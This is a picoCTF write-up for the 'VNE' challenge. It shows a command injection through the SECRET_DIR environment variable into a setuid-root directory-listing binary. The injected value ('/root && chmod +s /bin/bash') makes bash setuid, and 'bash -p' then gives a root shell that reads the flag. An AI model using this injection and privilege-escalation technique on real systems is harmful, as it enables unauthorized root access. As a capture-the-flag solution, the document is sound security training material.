# VNE - Binary Exploit

# Description

We've got a binary that can list directories as root, try it out !! 
ssh to saturn.picoctf.net:61530, and run the binary named "bin" once connected. 
Login as ctf-player with the password, 3f39b042

```bash
┌──(kali㉿kali)-[~/WriteUp/picoCTF]
└─$ ssh ctf-player@saturn.picoctf.net -p 61530
....[SNIPPED]....
ctf-player@pico-chall$ ls -la 
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 12 06:47 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
drwx------ 2 ctf-player ctf-player    34 Mar 12 06:47 .cache
-rw-r--r-- 1 root       root          67 Aug  4  2023 .profile
-rwsr-xr-x 1 root       root       18752 Aug  4  2023 bin
```

```bash
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ export SECRET_DIR='/root'
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
```
```bash
ctf-player@pico-chall$ export SECRET_DIR='/root && chmod +s /bin/bash'
ctf-player@pico-chall$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
ctf-player@pico-chall$ ./bin
Listing the content of /root && chmod +s /bin/bash as root: 
flag.txt

ctf-player@pico-chall$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
ctf-player@pico-chall$ /bin/bash -p
ctf-player@pico-chall$ whoami 
root
ctf-player@pico-chall$ cd /root
ctf-player@pico-chall$ ls -la 
total 12
drwx------ 1 root root   22 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Mar 12 06:44 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root   41 Aug  4  2023 flag.txt
ctf-player@pico-chall$ cat flag.txt 
picoCTF{Redacted}
ctf-player@pico-chall$ id
uid=1000(ctf-player) gid=1000(ctf-player) euid=0(root) egid=0(root) groups=0(root),1000(ctf-player)
ctf-player@pico-chall$ 
```